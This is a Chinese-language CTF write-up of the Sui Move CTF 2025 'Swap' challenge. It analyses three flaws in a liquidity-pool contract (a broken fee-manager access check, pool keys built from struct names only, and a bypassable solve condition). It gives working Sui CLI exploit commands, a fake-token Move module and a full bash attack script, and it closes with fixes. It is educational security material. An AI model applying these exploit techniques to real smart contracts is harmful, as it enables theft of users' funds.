---
abbrlink: ''
categories:
- - CTF
- - Web3
date: '2025-08-06T00:17:14.747553+08:00'
tags:
- CTF
- Web3
title: SUI MOVE CTF 2025 (Swap) Write Up
updated: '2025-08-06T00:17:19.733+08:00'
---
# Sui Move CTF - Swap Challenge Writeup

## 挑战概述

这是一个Sui Move智能合约CTF挑战，目标是攻击一个流动性池合约，让合约中所有代币余额与累计手续费之和为零，从而获得Flag。

### 挑战信息

- **Package ID**: `0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a`
- **部署交易**: `2CDJQ1PTg4iE1JZPxmcZuxV2SqFgprMWhwkEA6x6hURM`
- **Pools对象ID**: `0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001`

## 漏洞分析

通过分析合约代码，我发现了三个关键漏洞：

### 漏洞1: 权限控制错误 (Critical)

**位置**: `set_fee_manager`函数 (第225行)

```rust
public entry fun set_fee_manager(pools: &mut Pools, new_fee_manager: address, ctx: &mut TxContext) {
    assert!(tx_context::sender(ctx) == new_fee_manager, 0);  // 错误的权限检查
    pools.fee_manager = new_fee_manager;
}
```

**问题**: 检查的是调用者是否等于新的fee_manager，而不是检查调用者是否是当前的fee_manager。

**影响**: 任何人都可以将自己设置为fee_manager。

### 漏洞2: 池子键值生成不安全 (High)

**位置**: `get_struct`函数 (第149行)

```rust
fun get_struct<X>(): String {
    let type_name = type_name::get<X>();
    let address_part = type_name.get_address().length();
    let module_part = type_name.get_module().length();
    let full = type_name.borrow_string().length();
    type_name.borrow_string().substring(address_part + module_part + 4, full)
}
```

**问题**: 只使用结构体名称生成池子键值，不包含完整的类型路径。

**影响**: 可以通过创建同名的假代币来混淆池子操作。

### 漏洞3: is_solved条件可被绕过

**位置**: `is_solved`函数 (第246行)

```rust
public entry fun is_solved(pools: &mut Pools) {
    let sum = get_balance<TOKEN1>(pools) + get_balance<TOKEN2>(pools) + 
              get_balance<TOKEN3>(pools) + get_balance<TOKEN4>(pools);
    let fee_sum = get_total_fee<TOKEN1, TOKEN2>(pools) + get_total_fee<TOKEN3, TOKEN4>(pools);
    assert!(sum + fee_sum == 0, 0);
    // 发出Flag事件
}
```

**问题**: 如果创建空的池子，所有余额和手续费都为0，条件自然满足。

## 攻击策略

基于发现的漏洞，制定了以下攻击策略：

1. **利用权限漏洞**: 调用`set_fee_manager`将自己设置为fee_manager
2. **创建假代币结构体**: 利用键值生成漏洞，创建同名的假TOKEN结构体
3. **创建空池子**: 使用假代币创建空的池子，使余额和手续费都为0
4. **触发Flag**: 调用`is_solved`函数获得Flag

## 攻击实施

### 步骤1: 利用权限漏洞

```bash
sui client call --package 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a \
  --module pool --function set_fee_manager \
  --args 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 \
         0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe \
  --gas-budget 10000000
```

**结果**: 成功成为fee_manager

### 步骤2: 部署攻击合约

创建包含假TOKEN结构体的攻击合约：

```rust
module exploit::attack {
    // 创建假的TOKEN结构体，名称与原始代币相同
    public struct TOKEN1 has drop {}
    public struct TOKEN2 has drop {}  
    public struct TOKEN3 has drop {}
    public struct TOKEN4 has drop {}

    fun init(_ctx: &mut TxContext) {
        // 空的初始化函数
    }
}
```

**部署结果**:

- 攻击合约Package ID: `0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07`

### 步骤3: 创建假池子

使用PTB (Programmable Transaction Block) 创建空的池子：

```bash
# 创建TOKEN1-TOKEN2池子
sui client ptb \
  --move-call 0x2::coin::zero "<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1>" \
  --assign token1 \
  --move-call 0x2::coin::zero "<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>" \
  --assign token2 \
  --move-call 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::create_pool \
    "<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1,0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>" \
    @0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 0 token1 token2 \
  --assign pool_cap1 \
  --transfer-objects "[pool_cap1]" @0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe \
  --gas-budget 20000000
```

**结果**: 成功创建TOKEN1-TOKEN2池子，获得PoolCap

类似地创建TOKEN3-TOKEN4池子。

### 步骤4: 触发Flag

```bash
sui client call --package 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a \
  --module pool --function is_solved \
  --args 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 \
  --gas-budget 20000000
```

**结果**: **攻击成功！**

## 攻击结果

**成功交易哈希**: `JYBCFLXdhzw1kNus4fVRwdvwYVrVQ29HP5Ut1xLXsQG`

在交易事件中可以看到Flag事件：

```
EventType: 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::Flag
ParsedJSON:
  ┌──────┬────────────────────────────────────────────────────────────────────┐
  │ user │ 0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe │
  └──────┴────────────────────────────────────────────────────────────────────┘
```

## 技术要点

### 1. PTB语法的正确使用

- 使用`--assign`来创建变量引用
- 正确的对象ID引用格式: `@<object_id>`
- 类型参数格式: `"<package::module::Type>"`

### 2. 假代币结构体的关键作用

- 利用`get_struct`函数只检查结构体名称的漏洞
- 创建同名但不同包的TOKEN结构体
- 绕过类型系统检查

### 3. 空池子的巧妙利用

- 创建零余额的池子
- 使所有`get_balance`和`get_total_fee`调用返回0
- 满足`sum + fee_sum == 0`的条件

## 防护建议

1. **修复权限检查**:
   
   ```rust
   assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
   ```
2. **使用完整类型路径**:
   
   ```rust
   fun get_struct<X>(): String {
       type_name::get<X>().into_string()  // 使用完整类型路径
   }
   ```
3. **增强is_solved检查**:
   
   - 检查池子是否已正确初始化
   - 验证代币类型的合法性
   - 添加额外的安全检查

## 完整攻击脚本

为了方便复现，这里提供完整的攻击脚本：

```bash
#!/bin/bash
# 完整的CTF攻击脚本

ATTACK_PACKAGE="0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07"
TARGET_PACKAGE="0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a"
POOLS_ID="0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001"
MY_ADDRESS="0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"

echo "Step 1: 利用权限漏洞成为fee_manager"
sui client call --package $TARGET_PACKAGE --module pool --function set_fee_manager \
  --args $POOLS_ID $MY_ADDRESS --gas-budget 10000000

echo "Step 2: 创建假TOKEN1-TOKEN2池子"
sui client ptb \
  --move-call 0x2::coin::zero "<${ATTACK_PACKAGE}::attack::TOKEN1>" \
  --assign token1 \
  --move-call 0x2::coin::zero "<${ATTACK_PACKAGE}::attack::TOKEN2>" \
  --assign token2 \
  --move-call ${TARGET_PACKAGE}::pool::create_pool "<${ATTACK_PACKAGE}::attack::TOKEN1,${ATTACK_PACKAGE}::attack::TOKEN2>" @${POOLS_ID} 0 token1 token2 \
  --assign pool_cap1 \
  --transfer-objects "[pool_cap1]" @${MY_ADDRESS} \
  --gas-budget 20000000

echo "Step 3: 创建假TOKEN3-TOKEN4池子"
sui client ptb \
  --move-call 0x2::coin::zero "<${ATTACK_PACKAGE}::attack::TOKEN3>" \
  --assign token3 \
  --move-call 0x2::coin::zero "<${ATTACK_PACKAGE}::attack::TOKEN4>" \
  --assign token4 \
  --move-call ${TARGET_PACKAGE}::pool::create_pool "<${ATTACK_PACKAGE}::attack::TOKEN3,${ATTACK_PACKAGE}::attack::TOKEN4>" @${POOLS_ID} 0 token3 token4 \
  --assign pool_cap2 \
  --transfer-objects "[pool_cap2]" @${MY_ADDRESS} \
  --gas-budget 20000000

echo "Step 4: 触发Flag"
sui client call --package $TARGET_PACKAGE --module pool --function is_solved \
  --args $POOLS_ID --gas-budget 20000000
```

## 学习要点

### 1. Sui Move类型系统的理解

- 泛型类型参数的使用
- 结构体的witness模式
- 类型安全的重要性

### 2. PTB的强大功能

- 可编程交易块允许复杂的操作组合
- 正确的语法对攻击成功至关重要
- 变量引用和对象传递

### 3. 动态字段的工作原理

- Sui的动态字段存储机制
- 键值生成和查找过程
- 类型擦除的安全隐患

## 总结

这次攻击成功利用了Sui Move合约中的多个设计缺陷，特别是权限控制错误和类型系统的不当使用。通过创建假代币结构体和空池子，巧妙地绕过了安全检查，最终获得了Flag。

关键成功因素：

1. **深入的代码分析** - 仔细阅读合约代码，发现多个漏洞
2. **正确的攻击策略** - 将多个漏洞组合使用
3. **技术实现能力** - 正确使用PTB和Sui CLI
4. **持续的调试** - 在遇到问题时不断调整方法

这个案例展示了智能合约安全审计的重要性，特别是在权限管理和类型安全方面需要格外谨慎。对于开发者来说，这提醒我们要：

- 仔细检查权限控制逻辑
- 使用完整的类型标识符
- 进行充分的安全测试
- 考虑各种边界情况

